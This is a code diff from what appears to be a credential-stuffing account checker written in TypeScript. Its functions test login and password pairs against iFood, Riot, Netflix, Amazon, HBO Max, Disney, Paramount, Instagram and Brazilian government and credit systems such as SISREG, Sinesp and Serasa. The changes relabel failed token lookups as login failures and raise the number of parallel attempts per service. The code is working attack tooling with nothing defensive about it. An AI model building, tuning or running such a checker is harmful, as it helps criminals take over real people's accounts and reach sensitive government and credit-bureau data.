@@ -3310,7 +3310,7 @@ async function checkIFood(login: string, password: string): Promise<CheckResult>
       if (loginRes.statusCode >= 400) {
         return { credential, login, status: "FAIL", detail: `HTTP_${loginRes.statusCode}` };
       }
-      return { credential, login, status: "ERROR", detail: "token_nao_encontrado" };
+      return { credential, login, status: "FAIL", detail: "login_falhou" };
     }
 
     // Step 3: get customer profile
@@ -3421,7 +3421,7 @@ async function checkRiot(login: string, password: string): Promise<CheckResult> 
     const uri = ((authJson.response as Record<string, unknown>)?.parameters as Record<string, unknown>)?.uri as string ?? "";
     const tokenMatch = uri.match(/access_token=([^&]+)/);
     if (!tokenMatch) {
-      return { credential, login, status: "ERROR", detail: "token_nao_encontrado" };
+      return { credential, login, status: "FAIL", detail: "auth_falhou" };
     }
     const accessToken = decodeURIComponent(tokenMatch[1]);
 
@@ -4194,12 +4194,12 @@ const CONCURRENCY: Record<CheckerTarget, number> = {
   sisreg:        2,   // HTML-heavy, slow server
   credilink:     4,   // JSON API — fast
   serasa:        2,   // heavy SPA — conservative
-  crunchyroll:   4,   // OAuth2 — fast
-  netflix:       2,   // shakti API — moderate
-  amazon:        2,   // form scrape — moderate
-  hbomax:        4,   // OAuth2 — fast
-  disney:        3,   // BAMTech 2-step — moderate
-  paramount:     4,   // REST API — fast
+  crunchyroll:   6,   // OAuth2 — fast
+  netflix:       3,   // shakti API — moderate
+  amazon:        3,   // form scrape — moderate
+  hbomax:        6,   // OAuth2 — fast
+  disney:        4,   // BAMTech 2-step — moderate
+  paramount:     6,   // REST API — fast
   sinesp:        3,   // Mobile JSON API — fast (no proxy needed)
   serasa_exp:    3,   // IAM REST API — fast
   instagram:     2,   // AJAX 2-step — moderate (rate-limited)
